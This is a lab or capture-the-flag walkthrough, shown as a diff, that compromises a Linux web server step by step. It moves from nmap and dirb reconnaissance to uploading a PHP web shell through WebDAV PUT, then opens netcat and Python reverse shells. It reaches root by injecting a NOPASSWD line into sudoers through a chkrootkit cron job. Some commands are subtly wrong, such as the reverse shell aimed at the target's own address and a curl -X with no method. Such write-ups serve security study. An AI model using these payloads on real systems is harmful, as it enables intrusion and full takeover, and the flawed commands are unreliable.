@@ -1,0 +1,114 @@
+$ sudo netdiscover -i wlp2s0
+192.168.1.8
+
+$ nmap -sV 192.168.1.8 -p- -T5 -Pn
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+$ nmap -A 192.168.1.8 -p- -T5 -Pn
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
+|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
+|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
+80/tcp open  http    lighttpd 1.4.28
+|_http-server-header: lighttpd/1.4.28
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+lets run dirb on port 80
+
+$dirb http://192.168.1.8/
+
+---- Scanning URL: http://192.168.1.8/ ----
+==> DIRECTORY: http://192.168.1.8/test/                                        
+
+I tried lots of other things but nothing came up
+
+and finally I tried to see what methods that this page allows
+
+$ curl -i -X http://192.168.1.8/test
+
+
+HTTP/1.1 301 Moved Permanently
+DAV: 1,2
+MS-Author-Via: DAV
+Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+Location: http://192.168.1.8/test/
+Content-Length: 0
+
+it allows put method
+
+we can use this method to send a shell file over the server
+
+
+https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/
+
+there is a nice article about exploiting put mehtod
+
+
+first I tried to upload a php file to get the reverse shell but because of file's size 
+I was not able to upload a file
+
+then after some googleing I found a one line php shell
+
+$curl -v -X PUT -d '<?php system($_GET["e"]); ?>' http://192.168.1.8/test/shell.php
+
+now go to directory
+
+192.168.1.8/test/shell.php?e=ls
+
+now it works, lets get a reverse shell
+
+first we set up a listener on the local machine
+
+$ nc -lnvp 4444
+
+and go to url /shell.php?e=nc 192.168.1.8 4444
+
+I tried lots of ports only 443 worked
+
+$ nc -lnvp 443
+
+
+I decided to use python reverse shell
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.1.8",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+then go to url /shell.php?e=
+
+and now we got a shell
+
+$cat /etc/passwd
+
+john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
+
+there is a user called john
+
+I tried to own that user but nothing came up
+
+when I was searching around I found a chlrootkit in /etc/cron.daily/ file
+
+there is an exploit of this chkrootkit 
+
+echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update
+
+
+chmod 777 /tmp/update
+
+sudo su
+
+now we are root
+
